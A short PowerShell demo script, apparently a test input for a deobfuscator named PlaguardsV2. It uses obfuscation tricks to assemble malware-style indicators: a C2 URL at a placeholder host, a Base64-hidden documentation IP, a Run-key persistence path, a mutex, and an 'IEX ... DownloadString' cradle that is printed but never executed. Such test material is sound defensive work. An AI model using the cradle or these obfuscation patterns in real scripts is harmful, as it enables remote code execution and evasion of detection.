# PlaguardsV2 example script (inert demo, safe to analyze)
#
# Exercises the techniques the deobfuscator is built for: [char] arithmetic,
# repeated concatenation, variable reassignment, Base64, -replace, -join,
# -split, a byte-array decode and backtick-broken cmdlet names.
#
# Every indicator below is deliberately non-routable: RFC 2606 .invalid
# names and an RFC 5737 documentation IP. Nothing here is ever executed -
# PlaguardsV2 only reads it.

$four=[char](50+2);$port=$four+$four+$four+$four;$dom="example.invalid";$dom="malicious."+$dom;$c2="http://"+$dom+"/payload.ps1";$ip=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("MTk4LjUxLjEwMC40Mg=="));$ua=  "Mozilla/5.0 (Windows NT 10.0) "  +  "EVIL"+"BOT/1.0" ;$run="HKCU__Software__Microsoft__Windows__CurrentVersion__Run" -replace "__","\";$mtx="Global\"+(("ABAD","IDEA","123") -join "-");$hpref=("e3b0c442,98fc1c14,9afbf4c8" -split ",") -join "";$mkr=[Text.Encoding]::ASCII.GetString([byte[]](77,85,84,69,88));$cradle="IEX (New-Object Net.WebClient).DownloadString('"+$c2+"')";W`r`i`te-H`o`st "MARKER=$mkr`nC2=$c2`nIP=$ip`:$port`nUA=$ua`nRUN=$run`nMUTEX=$mtx`nSHA256pre=$hpref`nCRADLE[inert,not executed]=$cradle"
